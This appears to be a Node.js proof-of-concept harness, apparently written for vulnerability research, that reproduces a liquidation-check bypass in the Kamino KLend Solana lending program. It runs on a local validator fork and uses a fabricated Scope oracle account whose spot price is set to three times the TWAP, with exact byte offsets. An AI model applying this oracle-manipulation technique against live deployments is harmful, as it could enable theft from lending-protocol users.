#!/usr/bin/env node
"use strict";

// Part 2 (local validator only) for the Kamino Klend reduced-price-status liquidation bypass.
//
// WHAT THIS DOES
//   * Qualifies a read-only Solana mainnet endpoint in-process (never printed/persisted).
//   * Starts a loopback relay and a local `solana-test-validator`.
//   * Clones the current deployed KLend program (--clone-upgradeable-program) and a bounded
//     account set, and loads a *fabricated* Scope OraclePrices account at the JUP reserve's
//     configured scope feed address. The fabricator makes the spot entry diverge from the TWAP
//     entry by 3x, which is a price the program's own TWAP check classifies as failing, while
//     the spot/twap ages and heuristic remain valid.
//   * Proves the clone by reading accounts back from the LOCAL validator (program executable=true,
//     expected owner/length/data-hash).
//   * Sends refresh_reserve for the JUP reserve and reads back the reserve's stored
//     LastUpdate.price_status. If it is reduced (0x23 accepted, 0x3f rejected) with a
//     "Price twap check failed" log, the bypass precondition reproduced locally on the
//     deployed program binary.
//
// SECRETS CONTRACT: rpc_endpoints.txt is read in-process; the upstream value never reaches argv,
// disk, a log line, or evidence. The validator only ever receives http://127.0.0.1:<relayPort>.
// Local-only: no mainnet signing, no mainnet transaction, no production mutation. Throwaway
// keypair generated in-memory inside the Linux environment.
//
// Env:
//   KAMINO_FORK_MODE=refresh|clone   (default refresh)
//   SOLANA_HARNESS_EVIDENCE_DIR      (default reports/raw/fast/kamino-klend-fork)

const fs = require("fs");
const os = require("os");
const net = require("net");
const path = require("path");
const http = require("http");
const crypto = require("crypto");
const { spawn, spawnSync } = require("child_process");

const IS_WIN = process.platform === "win32";
const EXE = IS_WIN ? ".exe" : "";
const WORKSPACE = path.resolve(__dirname, "..");
const DEFAULT_BIN_DIR = IS_WIN
  ? path.join(WORKSPACE, "tools", "solana", "releases", "3.1.14", "solana-release", "bin")
  : path.join(process.env.HOME || "/home/mruserbox", ".local", "share", "solana-fork-harness", "v3.1.14", "solana-release", "bin");
const BIN_DIR = process.env.SOLANA_HARNESS_BIN_DIR || DEFAULT_BIN_DIR;
const VALIDATOR_BIN = path.join(BIN_DIR, `solana-test-validator${EXE}`);
const ENDPOINTS_FILE = process.env.SOLANA_HARNESS_ENDPOINTS || path.join(WORKSPACE, "rpc_endpoints.txt");
const EVIDENCE_DIR = process.env.SOLANA_HARNESS_EVIDENCE_DIR || path.join(WORKSPACE, "reports", "raw", "fast", "kamino-klend-fork");
const MODE = process.env.KAMINO_FORK_MODE || "refresh";

const MAINNET_GENESIS = "5eykt4UsFv8P8NJdTREpY1vzqKqZKvdpKuc147dw2N9d";
const PROGRAM_ID = "KLend2g3cP87fffoy8q1mQqGKjrxjC8boSyAYavgmjD";
const MAIN_MARKET = "7u3HeHxYDLhnCoErrtycNokbQYbWGzLs6JSDqGAv5PfF";
const JUP_RESERVE = "4AFAGAm5G8fkcKy7QerL88E7BiSE22ZRbvJzvaKjayor";
const JUP_SCOPE_FEED = "3NJYftD5sjVfxSnUdZ1wVML8f3aC6mp1CXCL6L7TnU8C";
const SPL_TOKEN_PROGRAM = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA";

const SCOPE_PRICE_ENTRY = 267;
const SCOPE_TWAP_ENTRY = 268;
const SCOPE_ORACLE_PRICES_PREFIX = 40; // discriminator(8) + oracle_mappings(32)
const SCOPE_DATED_PRICE_SIZE = 56;

const RESERVE_SIZE = 8624;
const LAST_UPDATE_SLOT_OFFSET = 16;
const LAST_UPDATE_STALE_OFFSET = 24;
const LAST_UPDATE_STATUS_OFFSET = 25;
const MARKET_PRICE_LAST_UPDATED_TS_OFFSET = 128 + 96 + 16; // reserve prefix + ReserveLiquidity prefix (approx; not used for control flow)

const FLAGS = { PRICE_LOADED: 0x01, PRICE_AGE_CHECKED: 0x02, TWAP_CHECKED: 0x04, TWAP_AGE_CHECKED: 0x08, HEURISTIC_CHECKED: 0x10, PRICE_USAGE_ALLOWED: 0x20, LIQUIDATION_CHECKS: 0x23, ALL_CHECKS: 0x3f };

const CAPS = { upstreamTimeoutMs: 180000, healthTimeoutMs: Number(process.env.SOLANA_HARNESS_HEALTH_MS || 300000), txTimeoutMs: 60000, maxCandidates: 10 };

const DENIED_METHODS = new Set(["sendTransaction", "sendRawTransaction", "requestAirdrop", "simulateTransaction", "sendBundle"]);
function methodAllowed(method) { return typeof method === "string" && !DENIED_METHODS.has(method) && /^(get|is)/.test(method); }
function isLoopback(remote) { return remote === "127.0.0.1" || remote === "::1" || remote === "::ffff:127.0.0.1"; }
function sha256Hex(b) { return crypto.createHash("sha256").update(b).digest("hex"); }
function sleep(ms) { return new Promise((r) => setTimeout(r, ms)); }
function discriminator(name) { return crypto.createHash("sha256").update(`global:${name}`).digest().subarray(0, 8); }
function decodeData(account) { const x = account && account.data; const s = Array.isArray(x) ? x[0] : x; return Buffer.from(s || "", "base64"); }

function readCandidates() {
  const text = fs.readFileSync(ENDPOINTS_FILE, "utf8");
  const urls = [];
  const seen = new Set();
  for (const line of text.split(/\r?\n/)) {
    if (!/solana|helius|mainnet-beta|rpcpool|quicknode/i.test(line)) continue;
    const m = line.match(/https?:\/\/[^\s\]\)]+/);
    if (!m) continue;
    const u = m[0].replace(/[.,;]+$/, "");
    if (u.includes("...") || seen.has(u)) continue;
    seen.add(u);
    urls.push(u);
    if (urls.length >= CAPS.maxCandidates) break;
  }
  return urls;
}

async function upstreamRaw(endpoint, bodyText, timeoutMs) {
  const ac = new AbortController();
  const timer = setTimeout(() => ac.abort(), timeoutMs);
  try {
    const resp = await fetch(endpoint, { method: "POST", headers: { "content-type": "application/json" }, body: bodyText, signal: ac.signal });
    if (!resp.ok) throw new Error("upstream-http-error");
    return await resp.text();
  } finally { clearTimeout(timer); }
}
async function upstreamCall(endpoint, req, timeoutMs) { return JSON.parse(await upstreamRaw(endpoint, JSON.stringify(req), timeoutMs)); }

async function qualifyEndpoint() {
  const candidates = readCandidates();
  let attempts = 0;
  for (const ep of candidates) {
    attempts += 1;
    try {
      const r = await upstreamCall(ep, { jsonrpc: "2.0", id: 1, method: "getGenesisHash", params: [] }, 8000);
      if (r && r.result === MAINNET_GENESIS) return { endpoint: ep, candidatesTested: attempts };
    } catch (_) { /* next */ }
  }
  throw new Error("no-qualified-solana-mainnet-endpoint");
}

function startRelay(endpoint) {
  const counts = Object.create(null); const denied = Object.create(null); let bytesIn = 0, bytesOut = 0;
  const server = http.createServer((req, res) => {
    const remote = req.socket.remoteAddress || "";
    if (req.method !== "POST" || !isLoopback(remote)) { res.writeHead(403); res.end(); return; }
    const chunks = []; let n = 0;
    req.on("data", (c) => { n += c.length; chunks.push(c); });
    req.on("end", async () => {
      let payload; let rawRequest;
      try { rawRequest = Buffer.concat(chunks).toString("utf8"); payload = JSON.parse(rawRequest); }
      catch { res.writeHead(400); res.end(); return; }
      const list = Array.isArray(payload) ? payload : [payload];
      for (const x of list) {
        const method = x && x.method;
        if (!methodAllowed(method)) { denied[String(method)] = (denied[String(method)] || 0) + 1; res.writeHead(403, { "content-type": "application/json" }); res.end(JSON.stringify({ jsonrpc: "2.0", id: (x && x.id) !== undefined ? x.id : null, error: { code: -32601, message: "relay-method-denied" } })); return; }
        counts[method] = (counts[method] || 0) + 1;
      }
      bytesIn += n;
      try {
        const text = await upstreamRaw(endpoint, rawRequest, CAPS.upstreamTimeoutMs);
        const body = Buffer.from(text); bytesOut += body.length;
        res.writeHead(200, { "content-type": "application/json", "content-length": body.length }); res.end(body);
      } catch {
        res.writeHead(502, { "content-type": "application/json" });
        res.end(JSON.stringify({ jsonrpc: "2.0", id: (list[0] && list[0].id) !== undefined ? list[0].id : null, error: { code: -32000, message: "relay-upstream-read-failed" } }));
      }
    });
  });
  return new Promise((resolve, reject) => {
    server.once("error", reject);
    server.listen(0, "127.0.0.1", () => resolve({ server, port: server.address().port, stats: () => ({ methods: counts, deniedMethods: denied, bytesIn, bytesOut }) }));
  });
}

function portFree(port) { return new Promise((resolve) => { const s = net.createServer(); s.once("error", () => resolve(false)); s.once("listening", () => s.close(() => resolve(true))); s.listen(port, "127.0.0.1"); }); }
async function findConsecutiveFree(start, span) { for (let p = start; p < start + span; p++) { if ((await portFree(p)) && (await portFree(p + 1))) return p; } throw new Error("no-free-validator-port"); }
async function findFreeRange(start, span, need) { for (let p = start; p < start + span; p++) { let ok = true; for (let i = 0; i < need; i++) { if (!(await portFree(p + i))) { ok = false; break; } } if (ok) return p; } throw new Error("no-free-dynamic-port-range"); }

async function localCall(url, method, params = [], timeoutMs = 30000) {
  const ac = new AbortController(); const timer = setTimeout(() => ac.abort(), timeoutMs);
  try {
    const resp = await fetch(url, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ jsonrpc: "2.0", id: 1, method, params }), signal: ac.signal });
    if (!resp.ok) throw new Error(`local-http-${resp.status}`);
    const json = await resp.json();
    if (json.error) throw new Error(`local-rpc-${json.error.message}`);
    return json.result;
  } finally { clearTimeout(timer); }
}
async function waitForHealth(url, timeoutMs) {
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) { try { if ((await localCall(url, "getHealth", [], 3000)) === "ok") return true; } catch (_) { /* wait */ } await sleep(1000); }
  return false;
}
async function waitForSignature(connection, signature, timeoutMs) {
  const deadline = Date.now() + timeoutMs; let last = null;
  while (Date.now() < deadline) {
    const r = await connection.getSignatureStatus(signature, { searchTransactionHistory: true });
    last = r && r.value ? r.value : null;
    if (last && (last.confirmationStatus === "confirmed" || last.confirmationStatus === "finalized")) return last;
    if (last && last.err) return last;
    await sleep(500);
  }
  return last;
}
function sanitizeLog(text) { return text.replace(/https?:\/\/[^\s"']+/g, (u) => (/^https?:\/\/(127\.0\.0\.1|localhost|\[::1\])([:/]|$)/.test(u) ? u : "<redacted-nonlocal-url>")); }

function accountJson(pubkey, lamports, dataBase64, owner, executable, rentEpoch) {
  return { pubkey, account: { lamports, data: [dataBase64, "base64"], owner, executable: !!executable, rentEpoch: rentEpoch === undefined ? 0 : rentEpoch } };
}

// Fabricate the Scope OraclePrices account: keep everything real, but make the spot entry
// diverge from the TWAP entry by 3x with a fresh timestamp so age checks still pass.
function fabricateScope(realData, nowSec) {
  const data = Buffer.from(realData);
  const off = SCOPE_ORACLE_PRICES_PREFIX + SCOPE_PRICE_ENTRY * SCOPE_DATED_PRICE_SIZE;
  const twapOff = SCOPE_ORACLE_PRICES_PREFIX + SCOPE_TWAP_ENTRY * SCOPE_DATED_PRICE_SIZE;
  const before = {
    spot: { value: data.readBigUInt64LE(off).toString(), exp: data.readBigUInt64LE(off + 8).toString(), ts: data.readBigUInt64LE(off + 24).toString() },
    twap: { value: data.readBigUInt64LE(twapOff).toString(), exp: data.readBigUInt64LE(twapOff + 8).toString(), ts: data.readBigUInt64LE(twapOff + 24).toString() },
  };
  const twapValue = data.readBigUInt64LE(twapOff);
  const twapExp = data.readBigUInt64LE(twapOff + 8);
  const divergent = (twapValue > 0n ? twapValue : 1_000_000_000n) * 3n;
  data.writeBigUInt64LE(divergent, off);
  data.writeBigUInt64LE(twapExp, off + 8);
  data.writeBigUInt64LE(BigInt(nowSec), off + 24);
  return { data, before, after: { spot: { value: divergent.toString(), exp: twapExp.toString(), ts: String(nowSec) } } };
}

async function main() {
  const evidence = {
    schema: "kamino-klend-fork-repro/1",
    generatedAt: new Date().toISOString(),
    mode: MODE,
    host: { platform: process.platform, arch: process.arch, node: process.version, binDir: BIN_DIR, validator: sanitizeLog(spawnSync(VALIDATOR_BIN, ["--version"], { encoding: "utf8" }).stdout || "").trim() },
    endpoint: {},
    clones: [],
    scopeFabrication: null,
    refresh: null,
    result: "UNKNOWN",
    unproven: [],
  };
  if (!fs.existsSync(VALIDATOR_BIN)) throw new Error("validator-binary-missing");

  const { endpoint, candidatesTested } = await qualifyEndpoint();
  evidence.endpoint = { qualified: true, candidatesTested };

  // Fetch the real Scope account (in-process) to fabricate from.
  const scopeRpc = await upstreamCall(endpoint, { jsonrpc: "2.0", id: 2, method: "getAccountInfo", params: [JUP_SCOPE_FEED, { encoding: "base64", commitment: "finalized" }] }, CAPS.upstreamTimeoutMs);
  const scopeAcct = scopeRpc && scopeRpc.result && scopeRpc.result.value;
  if (!scopeAcct) throw new Error("scope-account-unavailable");
  const scopeRealData = decodeData(scopeAcct);
  const nowSec = Math.floor(Date.now() / 1000);
  const fab = fabricateScope(scopeRealData, nowSec);
  evidence.scopeFabrication = {
    scopeFeed: JUP_SCOPE_FEED,
    owner: scopeAcct.owner,
    realDataBytes: scopeRealData.length,
    realDataSha256: sha256Hex(scopeRealData),
    priceEntryIndex: SCOPE_PRICE_ENTRY,
    twapEntryIndex: SCOPE_TWAP_ENTRY,
    before: fab.before,
    after: fab.after,
    note: "spot entry multiplied to 3x the TWAP entry value; timestamps refreshed; TWAP entry left real",
  };

  const tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), "kamino-fork-repro-"));
  const scopeFile = path.join(tmpRoot, "scope-fabricated.json");
  fs.writeFileSync(scopeFile, JSON.stringify(accountJson(JUP_SCOPE_FEED, scopeAcct.lamports, fab.data.toString("base64"), scopeAcct.owner, false, 0), null, 2), "utf8");

  // The local validator starts at slot ~0 while the cloned reserve carries a mainnet
  // last_update.slot in the hundreds of millions; LastUpdate::slots_elapsed uses checked_sub
  // and would underflow (MathOverflow). Load the reserve from a patched account file with
  // last_update.slot = 0 so the local slot arithmetic is valid.
  const reserveRpc = await upstreamCall(endpoint, { jsonrpc: "2.0", id: 3, method: "getAccountInfo", params: [JUP_RESERVE, { encoding: "base64", commitment: "finalized" }] }, CAPS.upstreamTimeoutMs);
  const reserveAcct = reserveRpc && reserveRpc.result && reserveRpc.result.value;
  if (!reserveAcct) throw new Error("reserve-account-unavailable");
  const reserveData = decodeData(reserveAcct);
  const originalReserveSlot = reserveData.readBigUInt64LE(LAST_UPDATE_SLOT_OFFSET);
  reserveData.writeBigUInt64LE(0n, LAST_UPDATE_SLOT_OFFSET);
  const reserveFile = path.join(tmpRoot, "reserve-patched.json");
  fs.writeFileSync(reserveFile, JSON.stringify(accountJson(JUP_RESERVE, reserveAcct.lamports, reserveData.toString("base64"), reserveAcct.owner, false, 0), null, 2), "utf8");
  evidence.reservePatch = {
    reserve: JUP_RESERVE,
    owner: reserveAcct.owner,
    dataBytes: reserveData.length,
    originalLastUpdateSlot: originalReserveSlot.toString(),
    patchedLastUpdateSlot: "0",
    reason: "avoid LastUpdate::slots_elapsed checked_sub underflow against the fresh local validator slot",
  };

  const relay = await startRelay(endpoint);
  const rpcPort = await findConsecutiveFree(8899, 500);
  const faucetPort = await findConsecutiveFree(9900, 500);
  const dynamicPortLo = await findFreeRange(18000, 500, 50);
  const ledgerDir = path.join(tmpRoot, "ledger");
  const relayUrl = `http://127.0.0.1:${relay.port}`;
  const rpcUrl = `http://127.0.0.1:${rpcPort}`;

  const args = [
    "--reset", "--ledger", ledgerDir, "--url", relayUrl, "--rpc-port", String(rpcPort),
    "--faucet-port", String(faucetPort), "--gossip-port", String(dynamicPortLo),
    "--dynamic-port-range", `${dynamicPortLo}-${dynamicPortLo + 49}`,
    "--clone-upgradeable-program", PROGRAM_ID,
    "--clone", MAIN_MARKET,
    "--account", JUP_RESERVE, reserveFile,
    "--clone", SPL_TOKEN_PROGRAM,
    "--account", JUP_SCOPE_FEED, scopeFile,
  ];

  let logBuf = "";
  const child = spawn(VALIDATOR_BIN, args, { cwd: tmpRoot, windowsHide: true, stdio: ["ignore", "pipe", "pipe"] });
  child.stdout.on("data", (d) => { if (logBuf.length < 400000) logBuf += d.toString(); });
  child.stderr.on("data", (d) => { if (logBuf.length < 400000) logBuf += d.toString(); });
  let exitInfo = null;
  child.on("exit", (code, signal) => { exitInfo = { code, signal }; });

  let ok = false;
  try {
    const healthy = await waitForHealth(rpcUrl, CAPS.healthTimeoutMs);
    if (!healthy) throw new Error("validator-health-timeout");

    const targets = [
      { label: "klend-program", address: PROGRAM_ID, expectExecutable: true },
      { label: "jup-reserve", address: JUP_RESERVE, expectExecutable: false },
      { label: "main-market", address: MAIN_MARKET, expectExecutable: false },
      { label: "jup-scope-fabricated", address: JUP_SCOPE_FEED, expectExecutable: false },
      { label: "spl-token-program", address: SPL_TOKEN_PROGRAM, expectExecutable: true },
    ];
    for (const t of targets) {
      const info = await localCall(rpcUrl, "getAccountInfo", [t.address, { encoding: "base64" }], 30000);
      if (!info || !info.value) { evidence.clones.push({ label: t.label, address: t.address, present: false }); continue; }
      const raw = decodeData(info.value);
      evidence.clones.push({ label: t.label, address: t.address, present: true, lamports: info.value.lamports, owner: info.value.owner, executable: info.value.executable, dataLen: raw.length, dataSha256: sha256Hex(raw), expectedExecutable: t.expectExecutable });
    }
    const programClone = evidence.clones.find((c) => c.label === "klend-program");
    const reserveClone = evidence.clones.find((c) => c.label === "jup-reserve");
    const scopeClone = evidence.clones.find((c) => c.label === "jup-scope-fabricated");
    const allPresent = evidence.clones.every((c) => c.present);
    const execOk = programClone && programClone.executable === true;
    const reserveOk = reserveClone && reserveClone.owner === PROGRAM_ID && reserveClone.dataLen === RESERVE_SIZE;
    const scopeOk = scopeClone && scopeClone.dataLen === scopeRealData.length;
    evidence.cloneProof = { allPresent, programExecutable: execOk, reserveOwnerLen: reserveOk, scopeLen: scopeOk };
    if (!allPresent || !execOk) throw new Error("clone-proof-failed");

    if (MODE === "clone") {
      evidence.result = "CLONE_PROVEN";
      ok = true;
    } else {
      // --- read pre-refresh reserve status ---
      const pre = decodeData((await localCall(rpcUrl, "getAccountInfo", [JUP_RESERVE, { encoding: "base64" }])).value);
      const preStatus = pre.readUInt8(LAYOUT_STATUS(pre));
      evidence.refresh = { preStatus: `0x${preStatus.toString(16).padStart(2, "0")}`, preSlot: Number(pre.readBigUInt64LE(LAST_UPDATE_SLOT_OFFSET)) };

      const web3 = require("@solana/web3.js");
      const connection = new web3.Connection(rpcUrl, "confirmed");
      const payer = web3.Keypair.generate();
      const airdropSig = await connection.requestAirdrop(payer.publicKey, 2 * web3.LAMPORTS_PER_SOL);
      await waitForSignature(connection, airdropSig, CAPS.txTimeoutMs);

      const disc = discriminator("refresh_reserve");
      const keys = [
        { pubkey: new web3.PublicKey(JUP_RESERVE), isSigner: false, isWritable: true },
        { pubkey: new web3.PublicKey(MAIN_MARKET), isSigner: false, isWritable: false },
        { pubkey: new web3.PublicKey(PROGRAM_ID), isSigner: false, isWritable: false },
        { pubkey: new web3.PublicKey(PROGRAM_ID), isSigner: false, isWritable: false },
        { pubkey: new web3.PublicKey(PROGRAM_ID), isSigner: false, isWritable: false },
        { pubkey: new web3.PublicKey(JUP_SCOPE_FEED), isSigner: false, isWritable: false },
      ];
      const ix = new web3.TransactionInstruction({ programId: new web3.PublicKey(PROGRAM_ID), keys, data: Buffer.from(disc) });
      const tx = new web3.Transaction().add(ix);
      const { blockhash } = await connection.getLatestBlockhash("confirmed");
      tx.recentBlockhash = blockhash; tx.feePayer = payer.publicKey; tx.sign(payer);
      let signature = null; let sendErr = null;
      try { signature = await connection.sendRawTransaction(tx.serialize(), { skipPreflight: false, maxRetries: 5 }); }
      catch (e) { sendErr = String(e && e.message ? e.message : e); }
      let statusValue = null; let txDetail = null;
      if (signature) {
        statusValue = await waitForSignature(connection, signature, CAPS.txTimeoutMs);
        for (let i = 0; i < 10 && !txDetail; i++) { txDetail = await connection.getTransaction(signature, { commitment: "confirmed", maxSupportedTransactionVersion: 0 }); if (!txDetail) await sleep(1000); }
      }
      // The write must be read at "confirmed" commitment (the default is "finalized", which can
      // still be behind on a fresh local validator right after the tx confirms).
      await sleep(2500);
      const post = decodeData((await localCall(rpcUrl, "getAccountInfo", [JUP_RESERVE, { encoding: "base64", commitment: "confirmed" }])).value);
      const postStatus = post.readUInt8(LAYOUT_STATUS(post));
      const logs = txDetail && txDetail.meta && txDetail.meta.logMessages ? txDetail.meta.logMessages : [];
      evidence.refresh = {
        ...evidence.refresh,
        instruction: "refresh_reserve",
        discriminatorHex: Buffer.from(disc).toString("hex"),
        signature, sendErr,
        confirmationStatus: statusValue ? statusValue.confirmationStatus : null,
        err: statusValue ? statusValue.err : null,
        detailFound: Boolean(txDetail),
        detailErr: txDetail && txDetail.meta ? txDetail.meta.err : null,
        logMessages: logs.filter((l) => /Price|twap|Token|Instruction/i.test(l)),
        twapFailureLogged: logs.some((l) => /twap check failed|too far from TWAP/.test(l)),
        postStatus: `0x${postStatus.toString(16).padStart(2, "0")}`,
        postSlot: Number(post.readBigUInt64LE(LAST_UPDATE_SLOT_OFFSET)),
        postStale: post.readUInt8(LAST_UPDATE_STALE_OFFSET) !== 0,
        postLiquidationChecksAccepted: (postStatus & FLAGS.LIQUIDATION_CHECKS) === FLAGS.LIQUIDATION_CHECKS,
        postAllChecksAccepted: (postStatus & FLAGS.ALL_CHECKS) === FLAGS.ALL_CHECKS,
        postReduced: (postStatus & FLAGS.LIQUIDATION_CHECKS) === FLAGS.LIQUIDATION_CHECKS && (postStatus & FLAGS.ALL_CHECKS) !== FLAGS.ALL_CHECKS,
      };
      if (txDetail && (!txDetail.meta || !txDetail.meta.err) && evidence.refresh.postReduced) {
        evidence.result = "BYPASS_PRECONDITION_REPRODUCED_LOCALLY";
        ok = true;
      } else if (txDetail && (!txDetail.meta || !txDetail.meta.err)) {
        evidence.result = "REFRESH_EXECUTED_BUT_STATUS_NOT_REDUCED";
        ok = true;
      } else {
        throw new Error("refresh-reserve-did-not-execute");
      }
    }
  } catch (err) {
    evidence.result = "FAIL";
    evidence.failure = String(err && err.message ? err.message : err);
    evidence.unproven = ["same-slot-liquidation-not-attempted-in-this-run"];
    const tail = sanitizeLog(logBuf).slice(-6000);
    if (tail.trim()) evidence.validatorLogTail = tail;
  } finally {
    try { child.kill(IS_WIN ? undefined : "SIGKILL"); } catch (_) { /* ignore */ }
    await sleep(1500);
    if (exitInfo === null && IS_WIN) { try { spawnSync("taskkill", ["/F", "/PID", String(child.pid)], { windowsHide: true, timeout: 5000 }); } catch (_) { /* ignore */ } }
    try { relay.server.close(); } catch (_) { /* ignore */ }
    const rs = relay.stats();
    evidence.relay = { bind: "127.0.0.1", methods: rs.methods, deniedMethods: rs.deniedMethods, bytesIn: rs.bytesIn, bytesOut: rs.bytesOut };
    evidence.validator = { exitCode: exitInfo ? exitInfo.code : null, logSha256: sha256Hex(Buffer.from(sanitizeLog(logBuf))), logLen: logBuf.length, redacted: true };
    try { fs.mkdirSync(EVIDENCE_DIR, { recursive: true }); fs.writeFileSync(path.join(EVIDENCE_DIR, "fork-repro.json"), JSON.stringify(evidence, null, 2), "utf8"); }
    catch (e) { console.error(`[kamino-fork] evidence write failed: ${e.message}`); }
  }
  console.error(JSON.stringify({ result: evidence.result, cloneProof: evidence.cloneProof, refresh: evidence.refresh ? { err: evidence.refresh.err, postStatus: evidence.refresh.postStatus, postReduced: evidence.refresh.postReduced, twapFailureLogged: evidence.refresh.twapFailureLogged } : null, failure: evidence.failure || null }, null, 2));
  process.exitCode = ok ? 0 : 1;
}

function LAYOUT_STATUS(buf) { return LAST_UPDATE_STATUS_OFFSET; }

main().catch((e) => { console.error(`[kamino-fork][fatal] ${e && e.message ? e.message : e}`); process.exitCode = 1; });
